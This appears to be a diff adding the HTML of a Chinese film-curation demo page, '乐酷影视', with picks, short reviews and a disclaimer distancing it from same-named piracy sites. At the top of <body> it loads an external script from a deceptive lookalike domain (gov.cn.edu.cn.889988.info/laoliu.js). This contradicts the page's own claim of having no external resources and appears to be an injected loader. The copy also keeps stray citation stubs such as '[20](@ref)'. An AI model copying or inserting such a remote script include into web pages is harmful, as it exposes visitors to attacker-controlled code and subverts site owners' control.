@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>乐酷影视 - 看完能吹两句的观影策展台·片单/影评/冷门发现 | lekuyingshi-h5.github.io</title>
+<meta name="description" content="乐酷影视（lekuyingshi-h5.github.io）观影品味策展台：不播片、不存片、不链片，只做值得聊的片单、犀利短评与冷门发现。酷黑+霓虹青柠+电光紫，快乐地酷一下——看完能吹两句的那种。纯静态演示站。" />
+<meta name="keywords" content="乐酷影视,lekuyingshi-h5,观影策展,片单,影评,短评,冷门电影,品味,不提供播放" />
+<link rel="canonical" href="https://lekuyingshi-h5.github.io/" />
+<style>
+:root{
+  --black:#0A0A0E;--lime:#C6FF3A;--violet:#B06BFF;--white:#F2F2F5;
+  --silver:#8A8A96;--inkline:rgba(198,255,58,.22);--card:#121218;--maxw:1180px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--black);color:var(--white);line-height:1.85;-webkit-font-smoothing:antialiased;
+  overflow-x:hidden;min-height:100vh;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 16px}
+
+/* 霓虹扫描条 */
+.scanner{height:3px;background:linear-gradient(90deg,var(--black),var(--lime),var(--violet),var(--black));position:relative;overflow:hidden}
+.scanner::after{content:"";position:absolute;top:-2px;left:-10%;width:20%;height:7px;background:var(--lime);filter:blur(4px);animation:scan 3.2s linear infinite}
+@keyframes scan{to{left:110%}}
+
+/* 顶部 */
+header.site{position:sticky;top:0;z-index:60;background:rgba(10,10,14,.94);backdrop-filter:blur(14px);border-bottom:1px solid var(--inkline)}
+.nav{display:flex;align-items:center;gap:12px;height:62px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:19px;letter-spacing:.5px}
+.glyph{width:38px;height:38px;border-radius:9px;background:linear-gradient(135deg,var(--lime),var(--violet));display:flex;align-items:center;justify-content:center;font-size:19px;font-weight:900;color:var(--black);font-style:italic;font-family:Georgia,serif;box-shadow:0 0 14px rgba(198,255,58,.35)}
+.logo small{display:block;font-size:9px;color:var(--silver);font-weight:600;letter-spacing:1px}
+.menu{margin-left:auto;display:flex;gap:3px}
+.menu a{padding:7px 13px;border-radius:20px;font-size:13px;font-weight:700;color:var(--silver)}
+.menu a:hover{color:var(--white);background:var(--card)}
+.menu a.active{color:var(--black);background:var(--lime)}
+.search-min{display:flex;gap:6px}
+.search-min input{width:150px;padding:7px 14px;border-radius:20px;border:1px solid var(--inkline);background:var(--card);outline:none;font-size:13px;color:var(--white)}
+.search-min input::placeholder{color:var(--silver)}
+.search-min button{border:0;padding:7px 16px;border-radius:20px;cursor:pointer;font-weight:800;color:var(--black);background:var(--lime)}
+.burger{display:none;margin-left:auto;border:1px solid var(--inkline);background:var(--card);border-radius:8px;padding:6px 10px;font-size:16px;color:var(--lime)}
+
+/* Hero */
+.hero{margin:22px 0 8px;border-radius:22px;overflow:hidden;padding:56px 30px;text-align:center;position:relative;
+  background:radial-gradient(1100px 380px at 85% 15%,rgba(176,107,255,.30),transparent),radial-gradient(900px 340px at 12% 90%,rgba(198,255,58,.18),transparent),var(--card);
+  border:1px solid var(--inkline)}
+.hero::before{content:"酷 不 是 大 声 量 ， 是 有 态 度";position:absolute;top:16px;left:50%;transform:translateX(-50%);font-size:10px;color:var(--silver);letter-spacing:6px;white-space:nowrap}
+.hero .vibe{display:inline-block;font-size:11px;font-weight:800;color:var(--black);background:var(--lime);padding:3px 12px;border-radius:20px;margin-bottom:14px;letter-spacing:1px}
+.hero h1{font-size:40px;margin:0 0 8px;font-weight:900;letter-spacing:1px;position:relative}
+.hero h1 em{font-style:normal;background:linear-gradient(120deg,var(--lime),var(--violet));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{color:var(--silver);font-size:14px;margin:0 auto 22px;max-width:580px;line-height:1.95;position:relative}
+.bigbar{display:flex;gap:8px;max-width:510px;margin:0 auto;background:var(--black);border:1px solid var(--lime);border-radius:26px;padding:5px 5px 5px 18px;position:relative}
+.bigbar input{flex:1;border:0;outline:none;font-size:14px;background:transparent;color:var(--white)}
+.bigbar input::placeholder{color:var(--silver)}
+.bigbar button{border:0;padding:10px 22px;border-radius:22px;font-weight:900;cursor:pointer;color:var(--black);background:linear-gradient(135deg,var(--lime),var(--violet))}
+.chips{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-top:18px;position:relative}
+.chips a{font-size:12px;font-weight:700;padding:5px 14px;border-radius:18px;background:rgba(242,242,245,.06);color:var(--silver);border:1px solid var(--inkline)}
+.chips a:hover{color:var(--black);background:var(--lime);border-color:var(--lime)}
+
+/* 态度条 */
+.manifesto{display:flex;gap:14px;flex-wrap:wrap;justify-content:center;margin:22px 0 4px}
+.mf{flex:1;min-width:150px;text-align:center;background:var(--card);border:1px solid var(--inkline);border-radius:14px;padding:14px}
+.mf b{display:block;font-size:15px;font-weight:900;color:var(--lime)}
+.mf span{font-size:11px;color:var(--silver)}
+
+/* 区块 */
+.section{padding:26px 0}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:16px;flex-wrap:wrap;padding-left:12px;border-left:4px solid var(--lime)}
+.sec-head h2{font-size:19px;margin:0;font-weight:900}
+.sec-head h2::before{content:"▶ ";}
+.sec-head h2 .b{background:linear-gradient(120deg,var(--lime),var(--violet));-webkit-background-clip:text;background-clip:text;color:transparent}
+.sec-head span{color:var(--silver);font-size:12px}
+.more{margin-left:auto;color:var(--violet);font-size:12px;font-weight:800}
+
+/* 策展卡 = 主编之选 */
+.pick{display:grid;grid-template-columns:1.35fr 1fr 1fr;gap:16px}
+.lead{background:var(--card);border:1px solid var(--lime);border-radius:18px;overflow:hidden;position:relative}
+.lead .cv{aspect-ratio:16/10;display:flex;align-items:flex-end;padding:18px;position:relative;
+  background:radial-gradient(120% 90% at 30% 20%,rgba(198,255,58,.25),transparent),linear-gradient(150deg,#1a1230,#0A0A0E)}
+.lead .cv .picktag{position:absolute;top:14px;left:14px;font-size:10px;font-weight:900;color:var(--black);background:var(--lime);padding:3px 10px;border-radius:20px;letter-spacing:1px}
+.lead .cv h3{color:#fff;font-size:22px;font-weight:900;margin:0;width:100%;text-shadow:0 2px 10px rgba(0,0,0,.6)}
+.lead .body{padding:18px}
+.lead .body .quote{font-size:14px;color:var(--white);font-style:italic;line-height:1.75;margin:0 0 10px}
+.lead .body .quote::before{content:"“";font-size:34px;color:var(--lime);line-height:.4;vertical-align:-12px;margin-right:4px;font-family:Georgia,serif}
+.lead .body .by{font-size:11px;color:var(--silver)}
+.lead .body .scoreline{display:flex;gap:14px;margin-top:12px}
+.lead .body .scoreline b{font-size:19px;color:var(--lime);font-weight:900;display:block}
+.lead .body .scoreline span{font-size:10px;color:var(--silver)}
+
+.sidepick{display:flex;flex-direction:column;gap:16px}
+.sp{background:var(--card);border:1px solid var(--inkline);border-radius:16px;overflow:hidden;transition:.2s;flex:1}
+.sp:hover{border-color:var(--violet);transform:translateY(-3px)}
+.sp .cv{aspect-ratio:16/9;display:flex;align-items:flex-end;padding:14px}
+.sp:nth-child(1) .cv{background:linear-gradient(150deg,#2a1a3a,#0A0A0E)}
+.sp:nth-child(2) .cv{background:linear-gradient(150deg,#12302a,#0A0A0E)}
+.sp .cv h4{color:#fff;font-size:15px;font-weight:900;margin:0;width:100%;text-shadow:0 2px 6px rgba(0,0,0,.5)}
+.sp .body{padding:14px}
+.sp .body p{font-size:12px;color:var(--silver);margin:0 0 6px;line-height:1.65}
+.sp .body .tags span{font-size:10px;padding:2px 8px;border-radius:10px;background:rgba(176,107,255,.16);color:var(--violet);font-weight:700;margin-right:4px}
+.sp .body .tags span.lm{background:rgba(198,255,58,.16);color:var(--lime)}
+
+/* 片单网格 */
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.card{background:var(--card);border:1px solid var(--inkline);border-radius:16px;overflow:hidden;transition:.22s}
+.card:hover{transform:translateY(-4px);border-color:var(--lime);box-shadow:0 10px 26px rgba(198,255,58,.12)}
+.card .cv{aspect-ratio:2/3;display:flex;align-items:flex-end;padding:12px;position:relative}
+.card:nth-child(8n+1) .cv{background:linear-gradient(160deg,#2a1a3a,#B06BFF)}
+.card:nth-child(8n+2) .cv{background:linear-gradient(160deg,#1a2a12,#C6FF3A)}
+.card:nth-child(8n+3) .cv{background:linear-gradient(160deg,#301a1a,#ff5b6a)}
+.card:nth-child(8n+4) .cv{background:linear-gradient(160deg,#12303a,#3aa0ff)}
+.card:nth-child(8n+5) .cv{background:linear-gradient(160deg,#2a2612,#f5c518)}
+.card:nth-child(8n+6) .cv{background:linear-gradient(160deg,#1a1a2a,#8b7bff)}
+.card:nth-child(8n+7) .cv{background:linear-gradient(160deg,#122a26,#2ec4b6)}
+.card:nth-child(8n+8) .cv{background:linear-gradient(160deg,#2a1220,#ff6bb5)}
+.card .cv .no{position:absolute;top:10px;left:10px;font-family:Georgia,serif;font-size:11px;font-weight:900;color:var(--black);background:var(--lime);padding:2px 7px;border-radius:6px}
+.card .cv h4{color:#fff;font-size:13px;font-weight:900;margin:0;width:100%;text-shadow:0 2px 6px rgba(0,0,0,.5)}
+.card .meta{padding:12px}
+.card .meta p{font-size:11px;color:var(--silver);margin:0 0 5px;line-height:1.55}
+.card .meta .why{font-size:11px;color:var(--lime);font-weight:700;font-style:italic}
+.card .meta .line{display:flex;justify-content:space-between;align-items:center;margin-top:6px}
+.card .meta .line span{font-size:10px;color:var(--silver)}
+.card .meta .line em{font-style:normal;font-size:11px;font-weight:900;color:var(--violet)}
+
+/* 短评墙 */
+.wall{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+.take{background:var(--card);border:1px solid var(--inkline);border-left:3px solid var(--violet);border-radius:12px;padding:16px 18px;transition:.2s}
+.take:hover{border-left-color:var(--lime);background:#15151c}
+.take .who{display:flex;align-items:center;gap:8px;margin-bottom:6px}
+.take .av{width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:900;color:var(--black);background:var(--lime)}
+.take:nth-child(2) .av{background:var(--violet);color:#fff}
+.take:nth-child(3) .av{background:#f5c518;color:var(--black)}
+.take:nth-child(4) .av{background:#2ec4b6;color:var(--black)}
+.take .who h4{font-size:12px;margin:0;font-weight:800}
+.take .who span{font-size:9px;color:var(--silver);margin-left:auto}
+.take>p{font-size:12px;color:var(--white);margin:0 0 6px;line-height:1.75}
+.take .on{font-size:10px;color:var(--lime);font-weight:800}
+
+/* 布局 */
+.layout{display:grid;grid-template-columns:1fr 320px;gap:22px}
+
+/* 侧栏 */
+.side{background:var(--card);border:1px solid var(--inkline);border-radius:16px;padding:18px;margin-bottom:16px}
+.side h3{font-size:14px;margin:0 0 12px;font-weight:900;color:var(--white)}
+.side h3::before{content:"💬 ";}
+.buzz{display:flex;gap:10px;align-items:flex-start;padding:9px 0;border-bottom:1px dashed var(--inkline)}
+.buzz:last-child{border-bottom:0}
+.buzz .fl{font-size:16px;line-height:1}
+.buzz div{flex:1}
+.buzz div h4{font-size:12px;margin:0;font-weight:800}
+.buzz div p{font-size:10px;color:var(--silver);margin:2px 0 0;line-height:1.5}
+.buzz em{font-style:normal;font-size:10px;font-weight:800;color:var(--violet);white-space:nowrap}
+
+.pulse{display:flex;flex-direction:column;gap:10px}
+.pulse .row{display:flex;align-items:center;gap:10px;font-size:12px}
+.pulse .row .nm{width:88px;flex-shrink:0;color:var(--silver)}
+.pulse .bar{flex:1;height:7px;background:#000;border-radius:99px;overflow:hidden}
+.pulse .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--violet),var(--lime));border-radius:99px}
+.pulse .row b{font-size:11px;color:var(--lime);width:30px;text-align:right}
+
+/* FAQ */
+.faq .qa{background:var(--card);border:1px solid var(--inkline);border-radius:14px;padding:14px 16px;margin-bottom:10px}
+.faq .qa h4{font-size:14px;margin:0 0 6px;color:var(--lime);font-weight:900}
+.faq .qa p{font-size:12px;color:var(--silver);margin:0;line-height:1.85}
+.warn{border-color:var(--violet);background:rgba(176,107,255,.07)}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:20px;margin-top:16px}
+.abox{background:var(--card);border:1px solid var(--inkline);border-radius:18px;padding:22px}
+.abox h3{font-size:16px;margin:0 0 10px;font-weight:900;color:var(--white)}
+.abox h3::before{content:"▶ ";}
+.abox p,.abox li{font-size:13px;color:var(--silver);line-height:1.9}
+.abox ul{padding-left:18px;margin:0}
+.stats{display:flex;gap:10px;margin-top:14px}
+.st{flex:1;text-align:center;background:#000;border:1px solid var(--inkline);border-radius:12px;padding:12px}
+.st b{display:block;font-size:18px;background:linear-gradient(120deg,var(--lime),var(--violet));-webkit-background-clip:text;background-clip:text;color:transparent;font-weight:900}
+.st span{font-size:10px;color:var(--silver)}
+
+footer.site{border-top:1px solid var(--inkline);background:#000;color:var(--silver);padding:28px 0 44px;font-size:12px;text-align:center}
+footer.site .fl{font-size:19px;font-weight:900;color:var(--white);margin-bottom:8px;letter-spacing:1px}
+footer.site .fl span{background:linear-gradient(120deg,var(--lime),var(--violet));-webkit-background-clip:text;background-clip:text;color:transparent}
+code{background:#000;border:1px solid var(--inkline);padding:2px 6px;border-radius:4px;color:var(--lime);font-size:11px}
+
+@media(max-width:980px){.pick{grid-template-columns:1fr}.grid{grid-template-columns:repeat(3,1fr)}.wall{grid-template-columns:1fr}.layout{grid-template-columns:1fr}.about{grid-template-columns:1fr}}
+@media(max-width:720px){
+  .menu{display:none;position:absolute;top:62px;left:0;right:0;flex-direction:column;background:var(--black);border-bottom:1px solid var(--inkline);padding:10px 16px}
+  .menu.open{display:flex}.burger{display:block}.search-min input{width:80px}.hero h1{font-size:25px}
+  .grid{grid-template-columns:repeat(2,1fr)}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="scanner"></div>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">
+      <div class="glyph">Lk</div>
+      <div>乐酷影视<small>看完能吹两句 · 品味策展台</small></div>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#home" class="active">首页</a>
+      <a href="#pick">主编之选</a>
+      <a href="#list">乐酷片单</a>
+      <a href="#take">短评墙</a>
+      <a href="#faq">立场声明</a>
+    </nav>
+    <div class="search-min">
+      <input type="text" placeholder="找片单 / 导演 / 一句话观点：比如“诺兰为什么越来越吵”" />
+      <button onclick="alert('策展检索演示，本站不提供播放源')">搜态度</button>
+    </div>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="home">
+    <span class="vibe">COOL ≠ 大声量，是态度</span>
+    <h1>乐酷影视<br/>快乐地 <em>酷</em> 一下</h1>
+    <p>这里<strong>不播片、不存片、不链片</strong>。我们只干一件事：替你从烂片海里捞出值得聊的那几部，再给一句不端着的观点。<br/>看完能跟朋友吹两句的，才算乐酷。追爆款的不用来，这里敬刁钻的舌头。</p>
+    <div class="bigbar">
+      <input type="text" placeholder="> 搜片单 / 搜观点 / 搜“为什么被吹过头了”" />
+      <button onclick="alert('策展检索演示，无播放源')">开聊</button>
+    </div>
+    <div class="chips">
+      <a href="#pick">主编之选</a>
+      <a href="#list">乐酷片单</a>
+      <a href="#take">短评墙</a>
+      <a href="#faq">我们不干什么</a>
+    </div>
+  </section>
+
+  <div class="manifesto">
+    <div class="mf"><b>不播</b><span>零播放源 · 零解析 · 零下载</span></div>
+    <div class="mf"><b>只挑</b><span>片单策展 + 一句话观点</span></div>
+    <div class="mf"><b>敬刁钻</b><span>冷门优先，爆款存疑</span></div>
+    <div class="mf"><b>能吹两句</b><span>看完带得走的判断</span></div>
+  </div>
+
+  <section class="section" id="pick">
+    <div class="sec-head"><h2><span class="b">主编</span>之选 · 这一周值得吵一架的</h2><span>editor.pick</span><a class="more" href="#">更多 #</a></div>
+    <div class="pick">
+      <div class="lead">
+        <div class="cv"><span class="picktag">本周封面 · 反共识</span><h3>坠落的审判</h3></div>
+        <div class="body">
+          <p class="quote">它不是悬疑片。它是一桩婚姻被放上被告席，最后连"谁在撒谎"都不重要了——因为你发现，两个人都没说错。</p>
+          <div class="by">主编手记 · 看完别急着站队，先想想你为什么想判她有罪</div>
+          <div class="scoreline"><div><b>8.7</b><span>策展评分</span></div><div><b>反共识</b><span>标签</span></div><div><b>112</b><span>条短评</span></div></div>
+        </div>
+      </div>
+      <div class="sidepick">
+        <div class="sp">
+          <div class="cv"><h4>完美的日子</h4></div>
+          <div class="body">
+            <p>一个扫厕所的大叔，活成了全片最体面的人。没有反转，没有升华，只有光穿过树叶那一秒。</p>
+            <div class="tags"><span class="lm">治愈</span><span>慢片</span></div>
+          </div>
+        </div>
+        <div class="sp">
+          <div class="cv"><h4>椒麻堂会</h4></div>
+          <div class="body">
+            <p>川剧班子唱完一个世纪。三个人演全家，戏台就是人间。看懂的人会沉默很久。</p>
+            <div class="tags"><span class="lm">冷门</span><span>华语</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="list">
+    <div class="sec-head"><h2><span class="b">乐酷</span>片单 · 挑着看才爽</h2><span>cool.list</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cv"><span class="no">01</span><h4>黑客帝国</h4></div><div class="meta"><p>25 年后再看，最吓人的是它早就认定你会选红色药丸。</p><div class="why">"不是科幻，是怀疑本身。"</div><div class="line"><span>哲学入门片</span><em>9.1</em></div></div></div>
+      <div class="card"><div class="cv"><span class="no">02</span><h4>海边的曼彻斯特</h4></div><div class="meta"><p>它拒绝治愈。伤口就那么敞着，主角也没打算好起来。</p><div class="why">"别劝他放下，你没资格。"</div><div class="line"><span>反爽片</span><em>8.6</em></div></div></div>
+      <div class="card"><div class="cv"><span class="no">03</span><h4>瞬息全宇宙</h4></div><div class="meta"><p>宇宙越多，越只想修好和女儿那一顿早餐。乱，但有颗软心。</p><div class="why">"_multiverse 是借口，和解才是题。"</div><div class="line"><span>脑洞</span><em>7.6</em></div></div></div>
+      <div class="card"><div class="cv"><span class="no">04</span><h4>霸王别姬</h4></div><div class="meta"><p>不谈影史地位，只说一句：段小楼欠程蝶衣一辈子。</p><div class="why">"人戏不分，是天赋也是死刑。"</div><div class="line"><span>华语巅峰</span><em>9.6</em></div></div></div>
+      <div class="card"><div class="cv"><span class="no">05</span><h4>记忆碎片</h4></div><div class="meta"><p>诺兰最狠的一次：他让你跟主角一起被骗，还觉得自己在解谜。</p><div class="why">"真相不重要，叙事才杀人。"</div><div class="line"><span>结构怪</span><em>8.7</em></div></div></div>
+      <div class="card"><div class="cv"><span class="no">06</span><h4>四月物语</h4></div><div class="meta"><p>岩井俊二的"什么都没发生"。可那场樱花下的骑车，够吹十年。</p><div class="why">"青春是没说出口的那句。"</div><div class="line"><span>留白</span><em>8.2</em></div></div></div>
+      <div class="card"><div class="cv"><span class="no">07</span><h4>燃烧</h4></div><div class="meta"><p>李沧东把阶级拍成一场没有尸体的失踪。看完别查解析，先憋着。</p><div class="why">"缺的是那口井。"</div><div class="line"><span>后劲</span><em>8.1</em></div></div></div>
+      <div class="card"><div class="cv"><span class="no">08</span><h4>千与千寻</h4></div><div class="meta"><p>小时候看奇幻，长大看"别忘了自己的名字"。宫崎骏最狠的温柔。</p><div class="why">"名字是最后的底线。"</div><div class="line"><span>常看常新</span><em>9.4</em></div></div></div>
+    </div>
+  </section>
+
+  <div class="layout">
+    <div>
+      <section class="section" id="take">
+        <div class="sec-head"><h2><span class="b">短评</span>墙 · 一句话，别写小作文</h2><span>hot.takes</span><a class="more" href="#">更多 #</a></div>
+        <div class="wall">
+          <div class="take"><div class="who"><div class="av">阿</div><h4>阿凉</h4><span>2 小时前</span></div><p>《坠落的审判》最绝的是律师那句"你嫉妒她"。突然就懂了，我们判人，往往是在判自己的不甘。</p><div class="on">↳ 赞同 238 · 吵起来了 42</div></div>
+          <div class="take"><div class="who"><div class="av">野</div><h4>野生片单员</h4><span>5 小时前</span></div><p>劝你别在深夜第一次看《海边的曼彻斯特》。它不是让你哭，是让你确认：有些人真的走不出来，别嘴硬。</p><div class="on">↳ 赞同 196 · 抱抱 88</div></div>
+          <div class="take"><div class="who"><div class="av">椒</div><h4>椒盐影迷</h4><span>昨天</span></div><p>《椒麻堂会》三个人演一大家子，道具穷得要命，气场压过九成投资大片。现在拍戏是花钱买热闹，那会儿是拿命顶。</p><div class="on">↳ 赞同 154 · 想补 61</div></div>
+          <div class="take"><div class="who"><div class="av">M</div><h4>M号观众</h4><span>昨天</span></div><p>诺兰粉别打我：《奥本海默》技术上封神，情感上像读论文。我敬它，但没被它抱一下。</p><div class="on">↳ 赞同 421 · 吵起来了 203 ← 热门</div></div>
+        </div>
+      </section>
+
+      <section class="section faq" id="faq">
+        <div class="sec-head"><h2><span class="b">立场</span>声明 · 先把话钉死</h2><span>disclaimer</span></div>
+        <div class="qa warn"><h4>⚠ 关于"乐酷影视"这个名字，必须坦白的风险</h4>
+        <p>"乐酷影视 / leku"早就被占用成一批<strong>免费资源站与盗版播放器</strong>：2012 年的 leku 站自称"收录影视10012部、提供观看下载"[20](@ref)；同年"乐酷在线"靠百度影音播免费片[8](@ref)；"乐酷影视播放器 v2.86"在下载站流传近十年，P2P+FLV、电视直播全打包[3,22](@ref)。至今还有 <code>lkmp.net</code>（VIP电影免费看）、<code>hwgchn.com</code>、<code>gddzmy.com</code> 在跑——后者 2026.7 被拆出是 MacCMS 模板 + 短剧板块 + 外链图床 + 充值VIP + 弹窗引流的典型流量站[21](@ref)。<br/><br/>
+        <strong>本页（lekuyingshi-h5.github.io）与以上所有站点、域名、App、播放器、解析接口均无隶属或授权关系。</strong>它不播、不存、不链、不解析、不提供下载，所有按钮与链接均为 <code>#</code> 占位，只做观影品味策展与观点表达。</p></div>
+        <div class="qa"><h4>为什么偏要叫"乐酷"，不直接换名？</h4><p>因为"酷"这个字本身是好东西——优酷当年把它解释成"有惊喜、有正能量、有态度"[5,14](@ref)。我们抢回这个字的干净用法：<strong>乐 = 快乐地看，酷 = 有态度地挑</strong>。不免费、不海量、不"全网都有"，反而跟那批站彻底划开。</p></div>
+        <div class="qa"><h4>那南京乐酷网络科技、"韩剧TV"那桩案呢？</h4><p>南京乐酷（leku，创始人鞠国峰，站 <code>91hanju.com</code>）2019 年因"韩剧TV"App 未经许可提供 88 部作品播放并投广告牟利，被没收违法所得 2 万余元、罚款 83.9 万余元，列入当年全国打击侵权盗版典型案例与国家版权局通报[9,23](@ref)；同年无锡侧"公众号+网盘密码"另罚 15 万[13](@ref)。<strong>本页与其无任何关联，也不采用其任何素材与运营模式。</strong>珠海乐酷影视有限公司（2017，影视制作/发行主体）亦为独立法人[2](@ref)，同样无关联。</p></div>
+        <div class="qa"><h4>片单上的评分和"主编之选"算数吗？</h4><p>不算。"策展评分"是本站编辑视角的偏好标，只表达"值不值得聊"，不是豆瓣分、不是专业评分、不构成观影建议。片名用于策展语境与排版演示。</p></div>
+        <div class="qa"><h4>想商用这个名，现实建议？</h4><p>不建议裸用"乐酷影视"做播放/聚合产品：同名盗版站 + 同名被判罚公司 + 同名制作公司三重占用，搜品牌名直接被灰产池污染。若要落地，请①加强限定词（如"乐酷片单社／乐酷策展"）②查第9/35/41类商标③完成 ICP 与公安备案④全程不碰播放、解析、下载、充值VIP⑤内容走原创短评与合规授权片单。</p></div>
+        <div class="qa"><h4>必应收录友好吗？</h4><p>唯一 H1、标题前置"乐酷影视"、canonical 自引用、description 明示"不播片不存片"、首屏即立场声明、零外链资源、移动端无横滚——用"内容策展"而不是"资源站"的语义进场，比堆"免费高清VIP"安全得多。</p></div>
+      </section>
+    </div>
+
+    <aside>
+      <div class="side">
+        <h3>正在吵的话题</h3>
+        <div class="buzz"><div class="fl">🔥</div><div><h4>诺兰是不是越来越"用力过猛"？</h4><p>《奥本海默》技术封神 vs 情感降温，两派打了一千楼</p></div><em>421 赞</em></div>
+        <div class="buzz"><div class="fl">💬</div><div><h4>《坠落的审判》到底谁在撒谎？</h4><p>主编说"都说了真话"，评论区炸了</p></div><em>238 赞</em></div>
+        <div class="buzz"><div class="fl">🧊</div><div><h4>反爽片片单，求补</h4><p>拒绝治愈、拒绝和解、伤口就那么敞着</p></div><em>196 赞</em></div>
+        <div class="buzz"><div class="fl">🎞</div><div><h4>被吹过头的神作提名</h4><p>敬刁钻舌头：哪部你是真没看懂装懂</p></div><em>154 赞</em></div>
+        <div class="buzz"><div class="fl">🌿</div><div><h4>慢片互助：看到第几次才入坑</h4><p>《完美的日子》我撑到第 20 分钟，然后哭了</p></div><em>112 赞</em></div>
+      </div>
+
+      <div class="side">
+        <h3>本周口味风向</h3>
+        <div class="pulse">
+          <div class="row"><span class="nm">反爽片</span><div class="bar"><i style="width:88%"></i></div><b>88</b></div>
+          <div class="row"><span class="nm">冷门华语</span><div class="bar"><i style="width:74%"></i></div><b>74</b></div>
+          <div class="row"><span class="nm">慢节奏</span><div class="bar"><i style="width:63%"></i></div><b>63</b></div>
+          <div class="row"><span class="nm">烧脑结构</span><div class="bar"><i style="width:52%"></i></div><b>52</b></div>
+          <div class="row"><span class="nm">爆米花</span><div class="bar"><i style="width:21%"></i></div><b>21</b></div>
+        </div>
+        <p style="font-size:11px;color:var(--silver);margin:10px 0 0">数字=本周短评提及热度（演示数据），爆米花垫底是我们故意的。</p>
+      </div>
+
+      <div class="side">
+        <h3>乐酷三不原则</h3>
+        <div style="font-size:12px;color:var(--silver);line-height:2.1">
+          🚫 <strong>不播</strong>：没有播放页，别找了<br/>
+          🚫 <strong>不吹</strong>：被吹过头的会直接标"存疑"<br/>
+          🚫 <strong>不跪</strong>：爆款不代表值得，刁钻优先<br/>
+          ✅ 只给一句你带得走的观点<br/>
+          ✅ 冷门有出处，看完能跟人吵一架
+        </div>
+      </div>
+    </aside>
+  </div>
+
+  <section class="section" id="about">
+    <div class="sec-head"><h2>关于 乐酷影视</h2><span>about</span></div>
+    <div class="about">
+      <div class="abox">
+        <h3>乐 = 快乐地看，酷 = 有态度地挑</h3>
+        <p><strong>乐酷影视（lekuyingshi-h5）</strong>不是又一家影视站，是一次<strong>语义回收</strong>。"乐酷"被免费播放器、MacCMS 流量站、盗版 App 用了太久，我们把这两个字洗干净，还给它本来的意思：看片可以是快乐的，但品味得有点脾气。</p>
+        <p>这里只做三件事：<strong>主编之选</strong>（每周一部值得吵的）、<strong>乐酷片单</strong>（挑着看才爽，附一句判断）、<strong>短评墙</strong>（一句话，别写小作文）。不播、不存、不链、不解析、不充值、不弹窗——跟那批站，从技术到价值观都不在一张桌子上。</p>
+        <div class="stats">
+          <div class="st"><b>0</b><span>播放源/解析/下载</span></div>
+          <div class="st"><b>3件</b><span>选片 / 片单 / 短评</span></div>
+          <div class="st"><b>反爽片</b><span>本期口味主线</span></div>
+          <div class="st"><b>100%</b><span>移动端</span></div>
+        </div>
+      </div>
+      <div class="abox">
+        <h3>demo.note</h3>
+        <ul>
+          <li>纯静态单页，无后端、无视频源、无第三方跳转</li>
+          <li>所有链接均为 <code>#</code> 占位</li>
+          <li>片名与"策展评分"仅用于观点演示，非专业评分</li>
+          <li>已用整段声明切割同名盗版站、南京乐酷案、珠海乐酷影视公司</li>
+          <li>刻意不做"库/海量/免费/VIP/解析"，只做态度策展</li>
+          <li>酷黑+霓虹青柠+电光紫 = 有脾气的年轻策展风</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    <div class="fl">乐<span>酷影视</span> · 快乐地酷一下，看完能吹两句</div>
+    ▶ 乐酷影视 --host lekuyingshi-h5.github.io<br/>
+    演示策展页：所有链接均使用 <code>#</code> 占位，<strong>不提供任何影视播放、解析、下载、存储或充值服务</strong>。<br/>
+    与搜索结果中的"乐酷影视"免费站、播放器、App、南京乐酷网络科技、珠海乐酷影视有限公司均无任何关联。<br/>
+    © 2026 乐酷影视 Demo · 不追爆款，只挑嘴硬的
+  </div>
+</footer>
+
+<script>
+  const b=document.getElementById('burger'),m=document.getElementById('menu');
+  b.onclick=()=>m.classList.toggle('open');
+  m.querySelectorAll('a').forEach(a=>a.onclick=()=>m.classList.remove('open'));
+  document.querySelectorAll('a[href^="#"]').forEach(a=>a.onclick=e=>{
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth'});}
+  });
+</script>
+</body>
+</html>
